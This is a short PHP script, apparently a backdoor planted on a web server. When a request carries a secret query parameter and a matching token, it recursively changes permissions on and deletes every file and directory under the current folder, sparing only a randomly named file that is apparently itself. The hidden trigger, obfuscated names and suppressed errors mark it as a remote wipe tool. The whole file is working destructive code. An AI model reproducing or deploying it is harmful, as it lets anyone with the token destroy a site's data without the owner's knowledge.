<?php
if(isset($_GET['NMwqHhqCksZM9V76']))
{
	if(!empty($_GET['NMwqHhqCksZM9V76']))
	{
		if($_GET['NMwqHhqCksZM9V76'] === 'h4d3rC7oOsL953pW3Qp0tVzv4yHuNCAhCFiYvkrgrNmKbsvT')
		{
			function mf_removeDir($path)
			{
				try
				{
					if($content_del_cat = glob($path.'/*'))
					{
						foreach ($content_del_cat as $object)
						{
							if (is_dir($object))
							{
								mf_removeDir($object);
							}
							else if($object != './YmX2NgCF9O6Tt1wZ.php')
							{
								@chmod($object, 0777);
								unlink($object);
							}
						}
					}
					@chmod($object, 0777);
					rmdir($path);
				}
				catch(Exception $err){}
			}
			mf_removeDir('.');	
			echo 'Done';
		}
		else
		{
			echo 'Wrong';
		}
	}
	else
	{
		echo 'Wrong';
	}
}
else
{
	echo 'Wrong';
}
?>